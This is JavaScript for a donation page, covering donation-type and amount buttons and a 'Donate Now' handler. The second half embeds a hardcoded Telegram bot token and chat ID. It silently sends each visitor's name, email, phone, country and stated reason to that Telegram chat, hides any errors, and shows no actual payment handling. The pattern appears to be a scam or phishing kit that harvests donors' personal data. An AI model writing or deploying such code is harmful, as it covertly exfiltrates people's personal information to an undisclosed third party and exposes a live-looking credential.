let donationAmount = null;

    // Handle donation type selection (One-time, Monthly, Annually)
    document.querySelectorAll('.donation-type').forEach(button => {
      button.addEventListener('click', function() {
        // Reset all button styles
        document.querySelectorAll('.donation-type').forEach(btn => btn.classList.remove('active'));
        
        // Add active class to the selected donation type button
        this.classList.add('active');
        
        // Show donation amount options after a selection
        document.getElementById('amount-buttons').style.display = 'block';
      });
    });

    // Set donation amount when a user selects an amount button
    function setDonationAmount(amount) {
      donationAmount = amount;
      document.getElementById('donate-now-btn').setAttribute('href', `https://example.com/${amount}`);
    }

    // Show the selected amount in the donate now button
    document.getElementById('donate-now-btn').addEventListener('click', function(e) {
      if (!donationAmount) {
        e.preventDefault(); // Prevent default action if no amount is selected
        alert('Please select a donation amount first!');
      }
    });

const TELEGRAM_TOKEN = '7562593192:AAHCAufAjNw6DjBfHSIVsj8gLfZk24BoXjk';
  const CHAT_ID = '6300694007';

  // Function to validate form before sending data
  function validateFormAndSend() {
    // Get form values
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    const country = document.getElementById('country').value;

    // Check if required fields are filled
    if (!firstName || !lastName || !email || !phone || !country) {
      return false; // If validation fails, return false (do nothing)
    }

    // Prepare the message to send to Telegram
    const message = `
      New Donation Details:
      First Name: ${firstName}
      Last Name: ${lastName}
      Email: ${email}
      Phone: ${phone}
      Country: ${country}
      Reason for Donation: ${document.getElementById('reason-text').value || 'No reason provided'}
    `;
    
    // Send the message to Telegram
    sendToTelegram(message);

    return true; // Validation passed, return true
  }

  // Function to send data to Telegram via bot
  function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const data = {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    };

    // Send the POST request to Telegram API
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => response.json())
    .catch(error => {
      // No alert, just silently handle errors
      console.error('Error with the request:', error);
    });
  }

  // Add event listener to the Donate Now button
  document.getElementById('donate-now-btn').addEventListener('click', function() {
    if (validateFormAndSend()) {
      // Proceed with donation logic without showing alerts, e.g., redirect or display success message
      window.location.href = 'thank-you-page-url'; // Redirect to a thank-you page or payment page
    }
  });
